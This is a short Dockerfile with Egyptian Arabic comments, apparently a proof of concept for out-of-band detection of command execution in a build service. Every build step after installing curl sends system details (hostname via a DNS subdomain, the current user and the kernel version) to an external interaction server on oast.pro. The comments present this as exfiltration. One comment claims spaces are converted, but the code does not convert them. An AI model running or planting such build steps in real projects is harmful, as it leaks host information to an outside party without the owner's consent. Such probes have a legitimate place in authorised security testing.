FROM alpine:latest

# 1. نزل الأدوات
RUN apk add --no-cache curl

# --- الطريقة الأولى: DNS Exfiltration (الأشيك) ---
# النتيجة هتجيلك كـ Subdomain
# لو السيرفر اسمه "linux-box"، اللوج هيجيلك: linux-box.d52....oast.online
RUN curl http://$(hostname).d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro

# --- الطريقة الثانية: HTTP Path (الأسهل قراءة) ---
# النتيجة هتجيلك في مسار الرابط
# اللوج هيجيلك: GET /root HTTP/1.1
RUN curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(whoami)

# --- الطريقة الثالثة: إثبات إمكانيات النظام ---
# بيبعتلك تفاصيل عن النسخة (Kernel Version) بس بنحول المسافات لشرط عشان الرابط ميبوظش
RUN export SYS_INFO=$(uname -r) && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$SYS_INFO
